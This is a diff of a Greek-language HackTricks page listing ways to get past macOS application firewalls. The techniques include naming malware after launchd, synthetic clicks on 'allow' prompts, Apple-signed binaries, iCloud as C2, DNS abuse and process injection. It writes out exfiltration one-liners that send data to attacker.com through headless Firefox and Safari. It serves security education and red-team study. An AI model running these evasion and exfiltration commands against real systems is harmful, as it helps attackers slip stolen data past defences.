@@ -1,56 +1,57 @@
-# Διάβρωση Τειχών Προστασίας στο macOS
+# Παράκαμψη Τοίχων Πυρασφάλειας στο macOS
+
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστηρίξτε το HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
 
-## Τεχνικές που βρέθηκαν
+## Εντοπισμένες τεχνικές
 
-Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε ορισμένες εφαρμογές τείχους προστασίας στο macOS.
+Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε μερικές εφαρμογές τοίχων πυρασφάλειας του macOS.
 
 ### Κατάχρηση ονομάτων λευκής λίστας
 
-* Για παράδειγμα, να ονομάζεται ο κακόβουλος κώδικας με ονόματα γνωστών διεργασιών του macOS όπως το **`launchd`**&#x20;
+* Για παράδειγμα, να ονομάζετε το malware με ονόματα γνωστών διεργασιών του macOS όπως **`launchd`**
 
 ### Συνθετικό Κλικ
 
-* Εάν το τείχος προστασίας ζητάει άδεια από τον χρήστη, ο κακόβουλος κώδικας μπορεί να **κάνει κλικ στο "επιτρέπω"**
+* Εάν ο τοίχος πυρασφάλειας ζητά άδεια από τον χρήστη, κάντε το malware **να κάνει κλικ στο επιτρέπω**
 
-### **Χρήση υπογεγραμμένων δυαδικών αρχείων της Apple**
+### Χρήση υπογεγραμμένων δυαδικών αρχείων της Apple
 
 * Όπως το **`curl`**, αλλά και άλλα όπως το **`whois`**
 
 ### Γνωστοί τομείς της Apple
 
-Το τείχος προστασίας μπορεί να επιτρέπει συνδέσεις σε γνωστούς τομείς της Apple, όπως το **`apple.com`** ή το **`icloud.com`**. Και η iCloud μπορεί να χρησιμοποιηθεί ως C2.
+Ο τοίχος πυρασφάλειας μπορεί να επιτρέπει συνδέσεις σε γνωστούς τομείς της Apple όπως το **`apple.com`** ή το **`icloud.com`**. Και το iCloud μπορεί να χρησιμοποιηθεί ως C2.
 
-### Γενική Διάβαση
+### Γενική Παράκαμψη
 
-Ορισμένες ιδέες για να προσπαθήσετε να διαβείτε τα τείχη προστασίας
+Μερικές ιδέες για να προσπαθήσετε να παρακάμψετε τους τοίχους πυρασφάλειας
 
-### Έλεγχος της επιτρεπόμενης κίνησης
+### Έλεγχος επιτρεπόμενης κίνησης
 
-Γνωρίζοντας την επιτρεπόμενη κίνηση, μπορείτε να αναγνωρίσετε δυνητικά τομείς που βρίσκονται στη λευκή λίστα ή ποιες εφαρμογές έχουν άδεια πρόσβασης σε αυτούς.
+Γνωρίζοντας την επιτρεπόμενη κίνηση θα σας βοηθήσει να αναγνωρίσετε πιθανώς τους τομείς που βρίσκονται στη λευκή λίστα ή ποιες εφαρμογές έχουν άδεια πρόσβασης σε αυτούς.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-### Κατάχρηση του DNS
+### Κατάχρηση DNS
 
-Οι αναλύσεις DNS γίνονται μέσω της εφαρμογής **`mdnsreponder`** που έχει υπογραφή και πιθανότατα θα επιτραπεί να επικοινωνήσει με τους διακομιστές DNS.
+Οι αναλύσεις DNS γίνονται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`** που πιθανόν να επιτραπεί να επικοινωνήσει με διακομιστές DNS.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Μέσω εφαρμογών περιήγησης
+### Μέσω εφαρμογών Περιηγητή
 
 * **oascript**
 ```applescript
@@ -73,13 +74,13 @@ end tell
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-* Περιήγηση Safari
+* Safari
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Μέσω εισαγωγής διεργασιών
+### Μέσω ενσωμάτωσης διεργασιών
 
-Εάν μπορείτε να **εισάγετε κώδικα σε μια διεργασία** που επιτρέπεται να συνδεθεί σε οποιονδήποτε διακομιστή, μπορείτε να παρακάμψετε τις προστασίες του τείχους προστασίας:
+Εάν μπορείτε **να ενθέτετε κώδικα σε μια διεργασία** που έχει άδεια να συνδεθεί σε οποιονδήποτε διακομιστή, μπορείτε να παρακάμψετε τις προστασίες του τοίχου προστασίας:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -89,16 +90,17 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστηρίξτε το HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
 
 </details>
+{% endhint %}
